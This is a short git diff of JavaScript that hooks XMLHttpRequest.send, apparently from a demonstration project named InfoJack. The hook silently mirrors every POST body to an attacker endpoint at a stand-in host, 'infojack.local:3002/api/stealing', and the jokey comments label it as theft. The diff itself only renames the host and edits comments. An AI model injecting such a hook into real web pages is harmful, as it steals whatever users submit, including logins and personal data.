@@ -13,19 +13,19 @@
     // Prevent infinite recursion, stealing our own loot.
     if (args[1] !== "DONTSTEAL") {
 
-      // 1: Mirror the postData to our own endpoint,
-      // 2: Profit?
+      // STEP 1: Mirror the postData to our own endpoint,
       var infoJackRequest = new XMLHttpRequest();
-      infoJackRequest.open("POST", "http://phishing.local:3002/api/stealing");
+      infoJackRequest.open("POST", "http://infojack.local:3002/api/stealing");
 
       // Send through to the original function with our
       // flag to prevent recursion
       infoJackRequest.send(args[0], "DONTSTEAL");
 
-      // Diabolical Laughter
+      // STEP 2: Diabolical Laughter
       console.log("Muhahaha..");
     }
 
+    // STEP 3: Profit?
     return originalSendFn.apply(this, args);
   }
 
